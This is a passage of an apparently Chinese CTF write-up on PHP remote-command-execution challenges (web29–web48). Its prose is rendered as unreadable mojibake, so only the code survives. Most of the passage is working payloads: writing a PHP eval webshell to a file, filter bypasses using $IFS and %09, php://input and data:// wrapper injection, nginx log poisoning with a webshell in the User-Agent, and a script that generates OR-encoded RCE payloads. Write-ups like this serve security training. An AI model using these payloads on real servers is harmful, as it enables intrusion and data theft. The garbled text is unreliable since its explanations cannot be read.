$_GET[&#39;c&#39;]; \n eval($c); â€œ &gt; a.phpâ€™);<br>&#x2F;a.php?c&#x3D;system(â€œtac flag.phpâ€);</p></blockquote><h4 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h4><p>è¿‡æ»¤äº†systemå‡½æ•°ï¼Œå¯ä»¥ç”¨åå¼•å·æ¥å‘½ä»¤æ‰§è¡Œ</p><p>Payload:</p><blockquote><p>1ã€nlå‘½ä»¤ï¼Œå¸¦ç€è¡Œå·è¾“å‡ºæ–‡æœ¬å†…å®¹<br>c&#x3D;echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl*ag.p*hp</code>;<br>echo <code>cp fl*ag.p*hp 1.txt | cat 1.txt</code>;<br>å•å¼•å·ï¼šå¼•å·é‡Œé¢çš„å†…å®¹ä¼šåŸå°ä¸åŠ¨çš„æ˜¾ç¤ºå‡ºæ¥ï¼ˆå¾ˆç®€å•ï¼Œä¸åšè§£é‡Šï¼‰<br>åŒå¼•å·ï¼šé‡Œé¢çš„ç‰¹æ®Šç¬¦å·ä¼šè¢«è§£æï¼Œå˜é‡ä¹Ÿä¼šè¢«æ›¿æ¢ï¼ˆ\ ç¬¦å·ã€ç©ºæ ¼ä¼šè¢«è§£æï¼‰<br>echo \a -&gt; a<br>echo â€œ\aâ€ -&gt; \a<br>2ã€passthruå‡½æ•°ï¼ŒåŒsystemï¼ŒåŒç†execï¼Œshell_execä¹Ÿå¯ä»¥ç”¨ï¼Œä¸è¿‡æœ‰ç‚¹éº»çƒ¦<br>c&#x3D;passthru(â€œcat fla*â€);<br>c&#x3D;exec(passthru(â€œcat fla*â€));<br>c&#x3D;shell_exec(passthru(â€œcat fla*â€));</p></blockquote><h4 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h4><p>é¢˜ç›®è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå•å¼•å·ï¼Œå°æ•°ç‚¹ï¼Œ</p><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨%09æ›¿ä»£ï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨{$IFS}ï¼Œå› ä¸ºå•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å¦‚æœä½¿ç”¨c&#x3D;passthru(â€œcat%09fla*â€);æˆ–è€…{$IFS}éƒ½ä¸ä¼šè¢«è§£é‡Šä¸ºç©ºæ ¼</p><p>æ‰€ä»¥æ„é€ å¦‚ä¸‹Payload:</p><blockquote><p>1ã€ä½¿ç”¨evalåµŒå¥—ã€‚å…·ä½“å‚æ•°ï¼špassthru ç»“åˆ%09ï¼Œä¹Ÿå¯ä»¥ç›´æ¥rceï¼Œå› ä¸ºæ²¡æœ‰å¯¹å…¶ä»–å‚æ•°è¿›è¡Œè¿‡æ»¤<br>å…¶ä¸­%09ç»•è¿‡ç©ºæ ¼ ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(â€œtac%09fla*â€); è¿™é‡Œéœ€è¦æ³¨æ„æ‹¬å·çš„é—­åˆï¼Œ&amp;çš„è¿æ¥ã€‚<br>2ã€ä½¿ç”¨å‚æ•°ï¼špassthruç»“åˆ $IFS$9<br>å…¶ä¸­$IFS$9ç»•è¿‡ç©ºæ ¼ï¼Œæ³¨æ„è½¬ä¹‰$ç¬¦å· ?<br>$9æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(â€œtac$IFS$9fla*â€);<br>3ã€ä½¿ç”¨æœªè¢«è¿‡æ»¤çš„å‘½ä»¤ã€‚passthruç›´æ¥è¯»å–<br>?c&#x3D;passthru(%22tac$IFS$9fla*%22); ä¹Ÿå°±æ˜¯passthru(â€œtac$IFS$9fla*â€);<br>4ã€ä½¿ç”¨pos(localeconv)æ¥è·å–å°æ•°ç‚¹<br>localeconvå¯ä»¥è¿”å›åŒ…æ‹¬å°æ•°ç‚¹åœ¨å†…çš„ä¸€ä¸ªæ•°ç»„ï¼›poså»å–å‡ºæ•°ç»„ä¸­å½“å‰ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¹Ÿå°±æ˜¯å°æ•°ç‚¹ã€‚ scandirå¯ä»¥ç»“åˆå®ƒæ‰«æå½“å‰ç›®å½•å†…å®¹ã€‚ ?c&#x3D;print_r(scandir(pos(localeconv()))); å¯ä»¥çœ‹åˆ°å½“å‰ç›®å½•ä¸‹æœ‰flag.php é€šè¿‡array_reverseæŠŠæ•°ç»„é€†åºï¼Œé€šè¿‡nextå–åˆ°ç¬¬äºŒä¸ªæ•°ç»„å…ƒç´ ï¼Œä¹Ÿå³flag.php ç„¶å?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote><h4 id="web32-nginxæ—¥å¿—æ³¨å…¥"><a href="#web32-nginxæ—¥å¿—æ³¨å…¥" class="headerlink" title="web32(nginxæ—¥å¿—æ³¨å…¥)"></a>web32(nginxæ—¥å¿—æ³¨å…¥)</h4><p>è¿‡æ»¤æ‰äº†flag|system|php|cat|sort|shell|.| |â€™|&#96;|echo|;|( åŒ…æ‹¬ç‚¹ï¼Œå•å¼•å·ï¼Œåå¼•å·ï¼Œåˆ†å·ï¼Œæ‹¬å·</p><p>æ‰€ä»¥è¿™é‡Œéœ€è¦ä½¿ç”¨includeæ¥æ„é€ Payload:</p><blockquote><p>1ã€?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>å…¶ä¸­?&gt;ä»£æ›¿åˆ†å·ï¼Œé¡µé¢ä¼šæ˜¾ç¤ºflag.phpå†…å®¹çš„base64ç¼–ç ï¼Œè§£ç å³å¯è·å–flag<br>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œæ—¥å¿—æ³¨å…¥<br>2ã€?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logæ˜¯nginxé»˜è®¤çš„accessæ—¥å¿—è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ï¼Œåœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨ä¸­å›½èšå‰‘è¿æ¥å³å¯</p><p>3ã€?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨php:&#x2F;&#x2F;inputç„¶åä½¿ç”¨postæ‰§è¡Œå‘½ä»¤<?php system("cat flag.php")?></p></blockquote><h4 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h4><p>ç›¸æ¯”ä¸Šä¸€å…³åªå¤šè¿‡æ»¤äº†â€œ</p><p>æ‰€ä»¥web32Payloadä¾æ—§é€‚ç”¨</p><h4 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h4><p>å¤šè¿‡æ»¤ä¸€ä¸ª:  ä¹‹å‰payloadä¾æ—§é€‚ç”¨</p><h4 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h4><p>å¤šè¿‡æ»¤ä¸€ä¸ª&#x3D; &lt;   ä¹‹å‰payloadä¾æ—§é€‚ç”¨</p><h4 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h4><p>å¤šè¿‡æ»¤äº†æ•°å­—  GETå‚æ•°æ”¹ä¸ºaå³å¯</p><h4 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>preg <span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span>ï¼Œ<span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>1ã€ä½¿ç”¨php:&#x2F;&#x2F;input POSTå†™å…¥phpä»£ç </p><?php system("cat fla*")?><p>2ã€ä½¿ç”¨dataåè®®</p><p>c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><?php system("tac flag.php")?></blockquote><h4 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h4><p>web37Payloadç…§æ ·æ‰“</p><h4 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php%20system("tac fla*.php");?><br>?&gt;ä¸ºphpç»“æŸç¬¦å·ï¼Œåé¢æ‹¼æ¥çš„.phpä¼šè¢«å¿½ç•¥æ‰ï¼Œä¸ç”¨ç®¡</p><h4 id="web40-æ•°ç»„å‡½æ•°"><a href="#web40-æ•°ç»„å‡½æ•°" class="headerlink" title="web40(æ•°ç»„å‡½æ•°)"></a>web40(æ•°ç»„å‡½æ•°)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     </code></pre><p>è¿™æ¬¡æ·»åŠ äº†å¾ˆå¤šè¿‡æ»¤ï¼Œä¹‹å‰æ–¹æ³•å¤§å¤šéƒ½ä¸è¡Œäº†</p><blockquote><p>1ã€c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); æˆ–è€… c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p><p>getcwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚å®ƒå¯ä»¥ä»£æ›¿pos(localeconv())</p><p>localeconv()ï¼šè¿”å›åŒ…å«æœ¬åœ°åŒ–æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯çš„å…³è”æ•°ç»„ã€‚è¿™é‡Œä¸»è¦æ˜¯è¿”å›å€¼ä¸ºæ•°ç»„ä¸”ç¬¬ä¸€é¡¹ä¸ºâ€.â€</p><p>pos():è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸æ”¹å˜æŒ‡é’ˆï¼›</p><p>current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œå’Œpos()ä¸€æ ·</p><p>scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚è¿™é‡Œå› ä¸ºå‚æ•°ä¸ºâ€.â€æ‰€ä»¥éå†å½“å‰ç›®å½•</p><p>array_reverse():æ•°ç»„é€†ç½®</p><p>next():å°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªï¼Œè¿™é‡Œå…¶å®å¯ä»¥çœç•¥å€’ç½®å’Œæ”¹å˜æ•°ç»„æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨[2]å–å‡ºæ•°ç»„ä¹Ÿå¯ä»¥</p><p>show_source():æŸ¥çœ‹æºç </p><p>pos() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚è¯¥å‡½æ•°æ˜¯current()å‡½æ•°çš„åˆ«åã€‚</p><p>æ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒçš„â€å½“å‰â€å…ƒç´ ï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p><p>æç¤ºï¼šè¯¥å‡½æ•°ä¸ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆã€‚</p><p>ç›¸å…³çš„æ–¹æ³•ï¼š</p><p>current()è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</p><p>end()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>prev()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>reset()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>each()è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</p><p>2ã€c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;éœ€è¦POSTä¼ å…¥å‚æ•°ä¸º1&#x3D;system(â€˜tac fl*â€™);</p><p>åŒç†?cmd&#x3D;system(â€œtac%20flag.phpâ€);&amp;c&#x3D;eval(pos(pos(get_defined_vars())));</p><p>get_defined_vars() è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„å¤šç»´æ•°ç»„ã€‚è¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ï¼Œä¾‹å¦‚GETã€POSTã€FILEç­‰ç­‰ã€‚</p><p>next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>array_pop() å‡½æ•°åˆ é™¤æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ å¹¶è¿”å›å…¶å€¼ã€‚</p><p>3ã€c&#x3D;session_start();system(session_id());<br>      passid&#x3D;ls</p><p><img src="web40.png" alt="web40" loading="lazy"></p><p>é€šè¿‡cookieè·å¾—å‚æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p>å—phpç‰ˆæœ¬å½±å“ 5.5 -7.1.9å‡å¯ä»¥æ‰§è¡Œï¼Œå› ä¸ºsession_idè§„å®šä¸º0-9ï¼Œa-z,A-Z,-ä¸­çš„å­—ç¬¦ã€‚åœ¨5.5ä»¥ä¸‹åŠ7.1ä»¥ä¸Šå‡æ— æ³•å†™å…¥é™¤æ­¤ä¹‹å¤–çš„å†…å®¹ã€‚ä½†æ˜¯ç¬¦åˆè¦æ±‚çš„å­—ç¬¦è¿˜æ˜¯å¯ä»¥çš„ã€‚</p></blockquote><h4 id="web41-rce-or"><a href="#web41-rce-or" class="headerlink" title="web41(rce_or)"></a>web41(rce_or)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>è¿‡æ»¤äº†<code>$ã€+ã€-ã€^ã€~</code>ä½¿å¾—<strong>å¼‚æˆ–è‡ªå¢å’Œå–å</strong>æ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ª<code>|</code>è¿ç®—ç¬¦</p><p>æ ¹æ®æ­£åˆ™åŒ¹é…ç”Ÿæˆå¯ç”¨å­—ç¬¦çš„é›†åˆrce_or.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>æ ¹æ®å¯ç”¨çš„å­—ç¬¦ç”ŸæˆPayload</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rce_or.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>   <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your functionï¼š"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your commandï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] result:\n"</span><span class="token operator">+</span>param<span class="token punctuation">)</span></code></pre><p><img src="web41.png" loading="lazy"></p><h4 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>Payload:</p><blockquote><p>?c&#x3D;cat flag.php;  ?c&#x3D;cat flag.php||  ?c&#x3D;cat flag.php%26(&amp;)    c&#x3D;nl flag.php%0a  ?c&#x3D;echo <code>tac fl*</code>||</p><p>ä½¿ç”¨ â€œ ; â€œ â€œ || â€œ â€œ &amp; â€œ â€œ &amp;&amp; â€œ åˆ†éš”</p><p>&#x2F;dev&#x2F;null 2&gt;&amp;1 æ„æ€æ˜¯å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘åˆ° &#x2F;dev&#x2F;null å³ä¸å›æ˜¾<br>; åˆ†å·<br>| åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤<br>|| åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤<br>&amp; ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ<br>&amp;&amp; ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</p></blockquote><h4 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h4><p>å¤šè¿‡æ»¤äº†cat,\å’Œï¼›ï¼Œä½¿ç”¨å…¶ä»–Payloadå³å¯</p><h4 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h4><p>å¤šè¿‡æ»¤äº†flagï¼Œä½¿ç”¨fla*å³å¯</p><h4 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h4><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½¿ç”¨$IFSæˆ–è€…%09ç»•è¿‡å³å¯</p><h4 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h4><p>è¿‡æ»¤äº†$å’Œ*ï¼ŒPayloadå¦‚ä¸‹ï¼š</p><blockquote><p>1ã€?c&#x3D;nl&lt;flaâ€™â€™g.php||</p><p>2ã€?c&#x3D;ca\t&lt;fl\ag.php||</p></blockquote><h4 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>Payload:</p><blockquote><p>tac%09flâ€™â€™ag.php||</p><p>â€¦â€¦.</p></blockquote><h4 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span 